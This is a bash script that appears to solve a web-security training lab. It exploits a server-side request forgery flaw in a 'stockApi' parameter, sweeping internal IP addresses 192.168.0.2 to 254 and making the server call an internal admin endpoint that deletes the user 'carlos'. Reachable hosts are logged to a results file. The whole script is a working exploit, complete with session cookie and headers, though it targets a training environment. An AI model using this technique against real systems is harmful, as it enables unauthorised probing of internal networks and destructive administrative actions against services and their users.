#!/bin/bash

# response=$(curl --write-out '%{http_code}' --silent --output /dev/null servername)
for x in {2..254}; do
    responseCode=$(curl --write-out '%{http_code}' --silent --output /dev/null  -i -s -k -X $'POST' \
    -H $'Host: ac491fab1e8e187480e64c86004600fe.web-security-academy.net' -H $'Connection: close' -H $'Content-Length: 61' -H $'User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Accept: */*' -H $'Origin: https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net/product?productId=3' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Cookie: session=xrViAAG98e8D50dsaPcJLUcCo759xd7q' \
    -b $'session=xrViAAG98e8D50dsaPcJLUcCo759xd7q' \
    --data-binary $"stockApi=http://192.168.0.$x:8080/admin/delete?username=carlos" \
    $'https://ac491fab1e8e187480e64c86004600fe.web-security-academy.net/product/stock')
    echo "[+] Checking 192.168.0.$x"
    if [ $responseCode != "500" ]; then
        echo "[+] Success ::: $responseCode"
        echo "Vulnerable! ::: 192.168.0.$x" >> results.txt
    fi
    echo "[x]Not Vulnerable ::: Response Code ::: $responseCode"
done
